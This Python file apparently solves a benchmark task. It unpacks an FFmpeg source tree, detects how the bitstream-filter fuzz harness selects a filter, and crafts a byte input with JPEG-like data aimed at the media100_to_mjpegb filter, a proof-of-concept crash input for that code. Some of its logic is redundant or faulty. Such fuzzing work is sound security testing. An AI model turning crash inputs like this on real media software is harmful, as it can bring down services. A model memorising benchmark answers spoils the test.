import os
import tarfile
import tempfile
import re
from typing import List, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            self._extract(src_path, td)
            # Try to detect the bsf-fuzzer harness input selection style.
            harness_style = self._detect_bsf_fuzzer_style(td)
            # Build a payload for the detected style, otherwise fallback.
            if harness_style == "by_name":
                return self._build_payload_by_name()
            elif harness_style == "by_index":
                idx, count = self._detect_bsf_index_and_count(td)
                return self._build_payload_by_index(idx, count)
            else:
                # Fallback: try both strategies together in one input (prefix by_name then padding and data)
                # This gives some chance of selecting the intended BSF regardless of harness.
                p_name = self._build_payload_by_name()
                # Ensure we keep length modest but include meaningful JPEG-like data
                p_data = self._jpeg_like_payload(800)
                # Combine with a delimiter and some redundancy
                payload = p_name + b"\x00" * 16 + p_data
                # Keep payload size reasonable
                if len(payload) > 4096:
                    payload = payload[:4096]
                return payload

    def _extract(self, src_path: str, out_dir: str) -> None:
        # Extract tar, tar.gz, or zip
        if src_path.endswith((".tar", ".tar.gz", ".tgz", ".tar.xz", ".txz", ".tar.bz2", ".tbz", ".tbz2")):
            with tarfile.open(src_path, "r:*") as tf:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonpath([abs_directory])
                    target_prefix = os.path.commonpath([abs_directory, abs_target])
                    return prefix == target_prefix
                for m in tf.getmembers():
                    member_path = os.path.join(out_dir, m.name)
                    if not is_within_directory(out_dir, member_path):
                        continue
                    tf.extract(m, out_dir)
        else:
            # If not a tarball, assume it's a directory
            if os.path.isdir(src_path):
                # Copy to out_dir? For simplicity, we just use it directly
                pass

    def _detect_bsf_fuzzer_style(self, src_dir: str) -> Optional[str]:
        # Search for fuzzer sources
        candidates = []
        for root, _, files in os.walk(src_dir):
            for fn in files:
                if re.search(r'(?i)(fuzz|fuzzer).*', fn) and fn.endswith((".c", ".cc", ".cpp")):
                    candidates.append(os.path.join(root, fn))
        # Look for BSF fuzzer and selection method
        for fp in candidates:
            try:
                txt = open(fp, "r", errors="ignore").read()
            except Exception:
                continue
            if "media100_to_mjpegb" in txt:
                # If the harness mentions the filter explicitly, prefer by_name approach
                if "av_bsf_get_by_name" in txt:
                    return "by_name"
            if "av_bsf_get_by_name" in txt and ("ConsumeRandomLengthString" in txt or "ConsumeBytes" in txt or "ConsumeString" in txt):
                return "by_name"
            if ("av_bsf_iterate" in txt or "av_bsf_next" in txt) and ("ConsumeIntegralInRange" in txt or "PickValueInArray" in txt):
                return "by_index"
        # Fallback: scan generic BSF-related harness
        for fp in candidates:
            try:
                txt = open(fp, "r", errors="ignore").read()
            except Exception:
                continue
            if "av_bsf_" in txt and "Fuzz" in txt:
                # Heuristic: prefer by_index (common pattern) if iteration symbols are present
                if ("av_bsf_iterate" in txt or "av_bsf_next" in txt):
                    return "by_index"
                if "av_bsf_get_by_name" in txt:
                    return "by_name"
        return None

    def _detect_bsf_index_and_count(self, src_dir: str) -> Tuple[int, int]:
        # Try to parse a list/array of bitstream filters from the FFmpeg source tree.
        # FFmpeg usually has libavcodec/bsf_list.c or all_bsf.c with arrays of &ff_*_bsf.
        arrays: List[str] = []
        for root, _, files in os.walk(src_dir):
            for fn in files:
                if not fn.endswith((".c", ".h")):
                    continue
                if "bsf" not in fn.lower():
                    continue
                full = os.path.join(root, fn)
                try:
                    txt = open(full, "r", errors="ignore").read()
                except Exception:
                    continue
                # Collect definitions of arrays listing bsfs
                if re.search(r'\b(const|static)\s+.*\*\s*const\s+\w*\s*\[\]\s*=\s*\{', txt):
                    arrays.append(txt)
                # Also parse register functions that list ff_*_bsf
                arrays.append(txt)

        # Extract candidate names from array initializers of the form &ff_..._bsf
        name_lists: List[List[str]] = []
        for txt in arrays:
            # Find all array initializer blocks
            for m in re.finditer(r'\{\s*((?:.|\n)*?)\}', txt):
                block = m.group(1)
                # If block references ff_*_bsf, parse names
                if "ff_" in block and "_bsf" in block:
                    names = re.findall(r'&\s*ff_([a-zA-Z0-9_]+)_bsf', block)
                    if names:
                        name_lists.append(names)

        # If none found, try scanning for register functions listing ff_*_bsf
        if not name_lists:
            for txt in arrays:
                # Parse sequences of ff_*_bsf references in code
                names = re.findall(r'ff_([a-zA-Z0-9_]+)_bsf', txt)
                if names:
                    # Keep order of first appearance
                    seen = []
                    ordered = []
                    for nm in names:
                        if nm not in seen:
                            seen.append(nm)
                            ordered.append(nm)
                    if ordered:
                        name_lists.append(ordered)

        # Use the longest list as the global order
        chosen_list: List[str] = []
        if name_lists:
            chosen_list = max(name_lists, key=len)
        else:
            # Fallback: list files in libavcodec/bsf/*.c and sort by name
            bsf_dir = None
            for root, dirs, files in os.walk(src_dir):
                if os.path.basename(root) == "bsf" and os.path.basename(os.path.dirname(root)) == "libavcodec":
                    bsf_dir = root
                    break
            names = []
            if bsf_dir:
                for fn in os.listdir(bsf_dir):
                    if fn.endswith(".c"):
                        nm = os.path.splitext(fn)[0]
                        names.append(nm)
            # Some files might not map 1:1 to exported ff_*_bsf names; still try
            chosen_list = sorted(names)

        # Find index of media100_to_mjpegb
        idx = 0
        if chosen_list:
            # Map potential file-base to exported ff_*_bsf name: expected to be same
            # e.g., media100_to_mjpegb
            try:
                idx = chosen_list.index("media100_to_mjpegb")
            except ValueError:
                # Try exported symbol name in chosen_list (without ff_ and _bsf)
                try:
                    idx = chosen_list.index("media100_to_mjpegb")
                except Exception:
                    # As a fallback, bias index to a middle value, many harnesses also randomize; this is a best-effort
                    idx = len(chosen_list) // 2 if chosen_list else 0
        count = max(1, len(chosen_list))
        return idx, count

    def _build_payload_by_name(self) -> bytes:
        # Common libFuzzer FuzzedDataProvider pattern: the harness consumes a random-length string
        # and uses av_bsf_get_by_name on it. We'll place the name up front, followed by a null terminator
        # and then some bytes for extradata/packet data.
        name = b"media100_to_mjpegb"
        # Build a JPEG-like payload to encourage MJPEG decoding. Include SOI and EOI with some markers.
        body = self._jpeg_like_payload(900)
        # Prepend the name with a null terminator; also include some length prefix redundancy.
        # Some harnesses may use ConsumeIntegral to decide string length; to be robust, we craft:
        # [8 bytes length][name][0][padding][body]
        length_prefix = (len(name) + 1).to_bytes(8, "little", signed=False)
        # Additional redundant fields to guide other ConsumeIntegral calls towards zero extradata etc.
        redundant = b""
        # Provide several zeros/ones to bias small extradata sizes in ConsumeIntegralInRange if used
        for _ in range(4):
            redundant += (0).to_bytes(8, "little", signed=False)
        payload = length_prefix + name + b"\x00" + redundant + body
        # Keep payload reasonably small; target around 1025 bytes if possible
        if len(payload) > 2048:
            payload = payload[:2048]
        return payload

    def _build_payload_by_index(self, index: int, count: int) -> bytes:
        # Emulate the common FuzzedDataProvider ConsumeIntegralInRange<size_t>(0, count-1)
        # Many implementations take a raw value v from sizeof(size_t) bytes and compute idx = v % count.
        # We'll craft multiple initial size_t values to increase the chance of matching.
        def le_size_t(v: int) -> bytes:
            # Assume 64-bit size_t
            return v.to_bytes(8, "little", signed=False)

        # craft multiple headers with our target index and equivalent representations
        headers = b""
        targets = [index, index + count, index + 2 * count, index + 3 * count]
        for t in targets:
            headers += le_size_t(t)
        # Bias extradata size and other integral fields to zero/small values
        for _ in range(4):
            headers += le_size_t(0)

        # Append a JPEG-like body to exercise the MJPEG path
        body = self._jpeg_like_payload(900)
        payload = headers + body
        # Keep within ~2048 bytes
        if len(payload) > 2048:
            payload = payload[:2048]
        return payload

    def _jpeg_like_payload(self, min_size: int) -> bytes:
        # Construct a small, JPEG-like byte sequence suitable for MJPEG decoding attempts.
        # This isn't guaranteed to be a valid JPEG, but includes key markers: SOI, DQT, SOF0, DHT, SOS, EOI.
        # Start Of Image
        data = bytearray()
        data += b"\xFF\xD8"
        # APP0 JFIF header
        data += b"\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        # DQT (Define Quantization Table) - one table
        qtable = bytes([
            16,11,10,16,24,40,51,61,
            12,12,14,19,26,58,60,55,
            14,13,16,24,40,57,69,56,
            14,17,22,29,51,87,80,62,
            18,22,37,56,68,109,103,77,
            24,35,55,64,81,104,113,92,
            49,64,78,87,103,121,120,101,
            72,92,95,98,112,100,103,99
        ])
        data += b"\xFF\xDB" + (len(qtable) + 3).to_bytes(2, "big") + b"\x00" + qtable
        # SOF0 (Baseline)
        sof = bytearray()
        sof += b"\x08"             # 8-bit
        sof += b"\x00\x01"         # height = 1
        sof += b"\x00\x01"         # width = 1
        sof += b"\x01"             # components = 1
        sof += b"\x01\x11\x00"     # component id = 1, sampling 1x1, quant table 0
        data += b"\xFF\xC0" + (len(sof) + 2).to_bytes(2, "big") + sof
        # DHT (Huffman Table) - minimal table (dummy, may be invalid but decoder will attempt)
        # We'll supply a small DC table for component 0
        dht = bytearray()
        dht += b"\x00"  # HTY DC, table 0
        dht += bytes([0]*16)  # 16 code lengths all zero (degenerate but forces parser)
        # No symbols since all code lengths are zero
        data += b"\xFF\xC4" + (len(dht) + 2).to_bytes(2, "big") + dht
        # SOS (Start of Scan)
        sos = bytearray()
        sos += b"\x01"       # number of components
        sos += b"\x01\x00"   # component 1, huffman tables 0/0
        sos += b"\x00\x3F\x00"  # Ss, Se, Ah/Al
        data += b"\xFF\xDA" + (len(sos) + 2).to_bytes(2, "big") + sos
        # Compressed data (dummy few bytes) followed by EOI
        data += b"\x00\x3F\xFF\xD9"

        # If the data is shorter than min_size, pad with 0xFF 0x00 sequences (stuffed bytes)
        if len(data) < min_size:
            pad_len = min_size - len(data)
            data += (b"\xFF\x00" * ((pad_len + 1) // 2))[:pad_len]
        # Ensure at least AV_INPUT_BUFFER_PADDING_SIZE zeros at the end to emulate typical padding
        data += b"\x00" * 64
        return bytes(data)
